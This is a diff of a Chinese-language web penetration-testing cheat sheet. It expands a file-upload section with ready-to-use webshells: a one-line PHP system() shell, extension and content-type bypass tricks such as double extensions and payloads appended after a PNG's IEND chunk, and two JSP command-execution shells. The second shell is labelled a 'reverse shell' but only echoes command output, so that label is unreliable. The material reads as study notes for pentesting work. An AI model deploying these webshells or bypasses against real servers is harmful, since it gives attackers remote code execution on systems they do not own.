@@ -290,9 +290,31 @@ create一個偽造的payload和一個對外的中間server溝通，並讓這個�
     前面的payload範例有提到很多都是透過GET qeury進行惡意操作，那麼我們只要把敏感操作都利用POST的方式處理，就可以大大降低CSRF發生的情況
 
 ### Upload
-* 如果沒有任何保護: 直接upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
-* 如果有保護但只看extension: 那就偽造extension後夾帶webshell達到RCE(`webshell.png.php`)
-* bypass `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)
+* 如果沒有任何保護: 直接 upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
+* 改 Extension: 如果有保護但只看 extension : 那就偽造 extension 後夾帶 webshell 達到 RCE (`webshell.png.php`)
+* 改 Content-Typebypass: `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)
+* 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
+* 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload
+
+#### JSP
+如果是 JSP 系統，有以下幾個 Payload 可以試看看
+* 最簡單
+    ```java
+    <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
+    ```
+* Reverse Shell
+    ```java
+    <%@ page import="java.io.*" %>
+    <%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = br.readLine()) != null) out.println(line);
+    }
+    %>
+    ```
 
 ### 如果是WordPress網頁
 * [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等
